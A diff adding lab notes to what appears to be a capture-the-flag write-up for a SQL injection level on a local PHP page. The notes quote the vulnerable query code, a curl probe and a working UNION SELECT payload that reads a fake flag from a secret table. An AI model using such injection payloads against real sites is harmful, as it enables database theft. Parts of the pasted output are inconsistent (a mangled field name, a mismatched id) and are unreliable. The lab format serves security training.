@@ -83,6 +83,48 @@
 
     [LEVEL 6]-TARGET: http://localhost:24001/level6.php
 
-       
+       $id = $database->real_escape_string($_GET["id"]);
+        print_r($id);
+        echo "<br>";
+        $sql = "SELECT content FROM posts WHERE id=" . $id;
+        print_r($sql);
+        echo "<br>";
+        $db_result = $database->query($sql);
+        print_r($db_result);
+        echo "<br>";
+
+    => Print sthg, let see.
+
+    - we will try this: curl http://localhost:24001/level6.php?id=3
+
+    => 3<br>SELECT content FROM posts WHERE id=3<br>mysqli_result Object
+            (
+                [current_field] => 0
+                [field_count] => 1
+                [lengths] => 
+                [num_ro$resultws] => 1
+                [type] => 0
+            )
+            <br>Array
+            (
+                [content] => https://blog.cyberjutsu.io/2021/05/13/HTML-sanitizer-vs-XSS/
+            )
+            <br>
+
+    => Use this payload to solve this challenge: curl http://localhost:24001/level6.php?id=3%20UNION%20SELECT%20content%20FROM%20secret6
+    => We got this: 
+        3 UNION SELECT content FROM secret6<br>SELECT content FROM posts WHERE id=31337 UNION SELECT content FROM secret6<br>mysqli_result Object
+            (
+                [current_field] => 0
+                [field_count] => 1
+                [lengths] => 
+                [num_rows] => 1
+                [type] => 0
+            )
+            <br>Array
+            (
+                [content] => CBJS{FAKE_FLAG_FAKE_FLAG}
+            )
+            <br>
 
 
